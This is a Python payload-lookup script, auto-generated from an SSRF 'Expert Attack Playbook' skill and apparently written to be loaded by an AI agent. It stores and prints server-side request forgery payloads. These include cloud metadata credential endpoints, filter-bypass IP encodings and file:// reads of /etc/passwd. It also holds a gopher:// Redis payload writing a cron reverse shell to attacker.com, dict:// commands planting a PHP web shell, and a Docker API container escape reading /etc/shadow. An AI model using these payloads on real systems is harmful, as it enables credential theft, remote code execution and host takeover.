#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/ssrf-server-side-request-forgery

Skill: SKILL: Server-Side Request Forgery (SSRF) — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-ssrf-server-side-request-forgery.py --help
      python hack-skills-ssrf-server-side-request-forgery.py --list
      python hack-skills-ssrf-server-side-request-forgery.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/ssrf-server-side-request-forgery'
TITLE = 'SKILL: Server-Side Request Forgery (SSRF) — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: ssrf-server-side-request-forgery", "description: >-", "SSRF playbook. Use when the server fetches URLs, resolves hostnames, imports remote content, or can be driven toward internal networks, cloud metadata, or secondary protocols."],
    'skill-server-side-request-forgery-ssrf-expert-attack-playbook': [],
    '0-quick-start': [],
    'extended-scenarios': ["Also load [SCENARIOS.md](./SCENARIOS.md) when you need:", "- WebLogic SSRF (CVE-2014-4210) \u2014 `uddiexplorer/SearchPublicRegistries.jsp` + `operator` parameter + `%0D%0A` CRLF to inject Redis commands", "- SSRF \u2192 internal Redis \u2192 write crontab reverse shell complete payload chain", "- DNS Rebinding deep dive \u2014 TTL=0 trick, initial-legit\u2192second-internal resolution, `rbndr.us` service", "- Kubernetes SSRF (CVE-2020-8555) and bypass (CVE-2020-8562) via DNS rebinding", "- SSRF through PDF/screenshot generators \u2014 `<iframe>` and `<img>` in HTML-to-PDF", "- Gopher protocol full TCP injection \u2014 Redis, MySQL, FastCGI payloads via Gopherus", "- URL parser confusion for filter bypass \u2014 `#@`, `\\@`, `%00@`, IPv6-mapped IPv4"],
    'advanced-reference': ["Also load [URL_PARSER_TRICKS.md](./URL_PARSER_TRICKS.md) when you need:", "- URL parser differential table: Python urllib vs requests vs Java URL vs PHP parse_url vs Node url.parse vs Go net/url", "- Full cloud metadata endpoint catalog (AWS IMDSv1/v2, GCP, Azure, DigitalOcean, Alibaba Cloud, Oracle Cloud, Kubernetes, Hetzner, OpenStack)", "- gopher:// payload recipes for Redis, MySQL, SMTP, FastCGI, Memcached (with encoding rules)", "- DNS Rebinding detailed attack flow with TTL manipulation and TOCTOU analysis", "- PDF/wkhtmltopdf/WeasyPrint/Chrome headless/PhantomJS SSRF patterns and exfiltration techniques", "If you just found a parameter that fetches a URL, perform first-pass confirmation here directly."],
    'first-pass-payloads': ["```text", "http://127.0.0.1/", "http://localhost/", "http://169.254.169.254/latest/meta-data/", "http://[::1]/", "http://127.1/"],
    'host-validation-bypass-families': [],
    'protocol-routing': [],
    '1-finding-ssrf-surface': ["Look for **any parameter containing DNS names, IP addresses, or URLs**:", "loc=           url=        path=         endpoint=", "imageUrl=      dest=       redirect=     uri=", "callback=      load=       file=         resource=", "link=          src=        data=         ref=", "**Less obvious SSRF vectors**:", "- PDF/screenshot generation (URL to capture)", "- Webhook configuration fields", "- Import/export via URL (CSV import, RSS/Atom feeds)", "- OAuth redirect URI (sometimes triggers server-side fetch)", "- `X-Forwarded-Host` / `X-Real-IP` headers in proxy chains", "- XML `DOCTYPE` with external entity (`file://`, `http://`)", "- GraphQL `@link` directive (federation)", "- Content-Type: `text/html` pages parsed for `<link>` preload headers"],
    '2-basic-confirmation-methodology': ["Step 1: Supply your Burp Collaborator / interact.sh URL", "\u2192 Check server initiates outbound connection (full SSRF confirmed)", "Step 2: If no callback \u2192 test time-based (open port = fast, closed = slow/reset):", "Compare response time for:", "http://192.168.1.1:22   (likely open \u2192 fast)", "http://192.168.1.1:9999 (likely closed \u2192 slow/timeout)", "Step 3: Try accessing localhost services:", "http://127.0.0.1:8080", "http://127.0.0.1:22", "http://127.0.0.1:6379  (Redis)", "http://127.0.0.1:9200  (Elasticsearch)", "http://127.0.0.1:5984  (CouchDB)", "http://127.0.0.1:2375  (Docker daemon \u2014 critical!)", "http://127.0.0.1:4840  (internal admin)"],
    '3-cloud-metadata-endpoints-must-try': [],
    'aws-ec2-imdsv1-no-auth-required-critical': ["http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME", "http://169.254.169.254/latest/user-data", "http://169.254.169.254/latest/meta-data/hostname", "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key"],
    'aws-imdsv2-token-required-but-check-if-ssrf-can-get-the-token': ["Step 1: PUT http://169.254.169.254/latest/api/token", "Header: X-aws-ec2-metadata-token-ttl-seconds: 21600", "Step 2: GET http://169.254.169.254/latest/meta-data/", "Header: X-aws-ec2-metadata-token: TOKEN", "**If SSRF supports custom headers \u2192 full IMDSv2 bypass**."],
    'google-cloud': ["http://metadata.google.internal/computeMetadata/v1/", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "Headers: Metadata-Flavor: Google"],
    'azure': ["http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Headers: Metadata: true", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"],
    'alibaba-cloud': ["http://100.100.100.200/latest/meta-data/", "http://100.100.100.200/latest/meta-data/ram/security-credentials/"],
    'kubernetes-service-account': ["file:///var/run/secrets/kubernetes.io/serviceaccount/token", "file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt", "http://kubernetes.default.svc/api/v1/namespaces/default/secrets"],
    '4-ip-address-filter-bypass-techniques': ["When `169.254.169.254`, `127.0.0.1`, `localhost` are blocked:"],
    'localhost-variants': ["127.0.0.1", "127.1", "127.0.1", "127.000.000.001    \u2190 octal padding", "0x7f000001         \u2190 hex", "2130706433         \u2190 decimal (0x7f000001)", "0177.0000.0000.0001  \u2190 octal", "[::]               \u2190 IPv6 loopback", "[::1]              \u2190 IPv6 loopback", "[::ffff:127.0.0.1] \u2190 IPv4-mapped IPv6"],
    '169-254-169-254-variants': ["169.254.169.254", "2852039166               \u2190 decimal", "0xa9fea9fe               \u2190 hex", "0251.0376.0251.0376      \u2190 octal", "[::ffff:169.254.169.254] \u2190 IPv6", "169.254.169.254.nip.io   \u2190 DNS rebinding service"],
    'private-network-ranges': ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "fc00::/7  \u2190 IPv6 private"],
    'bypass-filter-via-dns-input': ["If filter checks DNS-resolved IP (not hostname):", "http://attacker.com/  \u2190 DNS A record points to 169.254.169.254", "Use DNS rebinding: initial lookup returns valid IP \u2192 passes filter \u2192 second request returns internal IP."],
    '5-url-scheme-attacks': ["When `http://` is allowed or weakly filtered:", "file:///etc/passwd", "file:///proc/self/environ", "file:///proc/net/arp   \u2190 reveals internal network ARP table", "file:///proc/net/tcp   \u2190 open network connections", "dict://127.0.0.1:6379/INFO   \u2190 Redis INFO command via dict://", "gopher://127.0.0.1:6379/_INFO%0d%0a   \u2190 Redis via gopher", "gopher://127.0.0.1:9200/   \u2190 Elasticsearch", "sftp://attacker.com:11111/   \u2190 triggers SFTP connection (credential hash)", "ldap://attacker.com:389/     \u2190 triggers LDAP bind", "ftp://attacker.com/          \u2190 triggers FTP connection"],
    'redis-gopher-ssrf-full-rce-potential': ["gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0Aping%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2456%0D%0A%0D%0A%0A%0A*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0A%0A%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A"],
    '6-blind-ssrf-detection': ["When response doesn't reflect fetched content:", "1. **Burp Collaborator / interact.sh**: check for DNS + HTTP request from server", "2. **Pingback/webhook abuse**: configure application's own webhook to your URL", "3. **Timing analysis**: Internal open port vs closed port response time difference", "4. **Error analysis**: Different error messages for \"host not found\" vs \"connection refused\" vs \"timeout\" reveal internal network topology"],
    '7-internal-service-exploitation': [],
    'docker-api-2375-unauthenticated': ["http://127.0.0.1:2375/v1.24/containers/json      \u2190 list containers", "http://127.0.0.1:2375/v1.24/images/json          \u2190 list images"],
    'create-privileged-container-escape-to-host': ["POST http://127.0.0.1:2375/v1.24/containers/create", "{\"Image\":\"alpine\",\"Cmd\":[\"cat\",\"/etc/shadow\"],\"HostConfig\":{\"Binds\":[\"/:/host\"]}}"],
    'elasticsearch-9200-no-auth-default': ["http://127.0.0.1:9200/_cat/indices", "http://127.0.0.1:9200/.kibana/_search", "http://127.0.0.1:9200/INDEX_NAME/_search?q=*"],
    'redis-6379-no-auth-common': ["dict://127.0.0.1:6379/CONFIG:SET:dir:/var/www/html", "dict://127.0.0.1:6379/CONFIG:SET:dbfilename:shell.php", "dict://127.0.0.1:6379/SET:key:<?php system($_GET[c]);?>", "dict://127.0.0.1:6379/BGSAVE"],
    'internal-admin-panels': ["http://127.0.0.1:8080/admin", "http://127.0.0.1:8443/admin", "http://127.0.0.1:9000/actuator   \u2190 Spring Boot actuator (exposed endpoints)", "http://127.0.0.1:9000/actuator/env", "http://127.0.0.1:9000/actuator/heapdump"],
    '8-ssrf-filter-bypass-decision-tree': ["SSRF parameter found?", "\u251c\u2500\u2500 Try http://169.254.169.254/ directly \u2192 blocked?", "\u2502   \u251c\u2500\u2500 Try decimal/hex/octal variants", "\u2502   \u251c\u2500\u2500 Try IPv6 variants [::ffff:169.254.169.254]", "\u2502   \u251c\u2500\u2500 Try DNS rebinding (nip.io, custom NS)", "\u2502   \u2514\u2500\u2500 Try redirect: attacker.com \u2192 169.254.169.254 (302)", "\u251c\u2500\u2500 Try http://127.0.0.1/ \u2192 blocked?", "\u2502   \u251c\u2500\u2500 Try 127.1 / 127.0.1 / 0x7f000001 / 2130706433", "\u2502   \u251c\u2500\u2500 Try localhost \u2192 might not be blocked", "\u2502   \u2514\u2500\u2500 Try IPv6 [::1]", "\u251c\u2500\u2500 What protocols are allowed?", "\u2502   \u251c\u2500\u2500 dict:// \u2192 test Redis, Memcached", "\u2502   \u251c\u2500\u2500 gopher:// \u2192 full TCP data injection (target Redis/SMTP)", "\u2502   \u251c\u2500\u2500 file:// \u2192 local file read", "\u2502   \u2514\u2500\u2500 sftp:// ldap:// ftp:// \u2192 network interactions", "\u2514\u2500\u2500 Blind SSRF \u2192 use Burp Collaborator", "\u2514\u2500\u2500 DNS-only \u2192 use DNS rebinding or SSRF with OOB DNS"],
    '9-the-ssrf-filter-mindset': ["From zseano's methodology: **if developers filter only `169.254.169.254` directly but not `http://169.254.169.254/latest/meta-data`** (full path), or forget about:", "- IPv6 equivalents", "- DNS names that resolve to internal IPs", "- Redirect chains (server follows 302 to internal IP)", "**Classic gap**: App filters `127.0.0.1` but not `127.1` or `[::1]` or `localhost`.", "**Application-layer SSRF via XML** (when app parses XML):", "```xml", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]>", "<request>&xxe;</request>"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()